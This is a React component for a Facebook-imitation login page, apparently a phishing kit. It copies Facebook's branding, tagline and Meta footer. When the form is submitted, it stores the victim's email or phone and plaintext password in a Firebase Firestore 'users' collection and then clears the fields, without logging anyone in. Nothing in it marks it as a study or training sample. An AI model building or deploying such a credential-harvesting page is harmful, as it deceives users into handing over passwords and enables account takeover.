import React, { useState } from "react";
import "./Login.css";

// Firebase import
import { collection, addDoc, serverTimestamp } from "firebase/firestore";
import { db } from "./firebase";

const Login = () => {
  const [phoneOrEmail, setPhoneOrEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      
      await addDoc(collection(db, "users"), {
        phoneOrEmail: phoneOrEmail,
        password: password, 
        createdAt: serverTimestamp(),
      });

      
      setPhoneOrEmail("");
      setPassword("");
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="login-left">
          <h1>MD. ONTOR SHEIKH</h1>
          <h1 className="facebook-title">facebook</h1>
          <h2 className="tagline">
            Facebook helps you connect and share
            <br /> with the people in your life.
          </h2>
        </div>

        <div className="login-right">
          <div className="login-card">
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                placeholder="Email address or phone number"
                value={phoneOrEmail}
                onChange={(e) => setPhoneOrEmail(e.target.value)}
                required
                className="login-input"
              />

              <div className="password-wrapper">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="login-input"
                />
                <button
                  type="button"
                  className="toggle-password"
                  onClick={() => setShowPassword((s) => !s)}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <button type="submit" className="login-btn">
                Log in
              </button>
            </form>

            

            <a href="#" className="forgot-password">
              Forgotten password?
            </a>

            <div className="divider"></div>

            <button className="create-account-btn">Create new account</button>
          </div>

          <p className="create-page">
            <a href="#">Create a Page</a> for a celebrity, brand or business.
          </p>
        </div>
      </div>

      <footer className="login-footer">
        <div className="footer-links">
          English (UK) · বাংলা · অসমীয়া · हिन्दी · More...
        </div>
        <div className="footer-copyright">Meta © 2025</div>
      </footer>
    </div>
  );
};

export default Login;
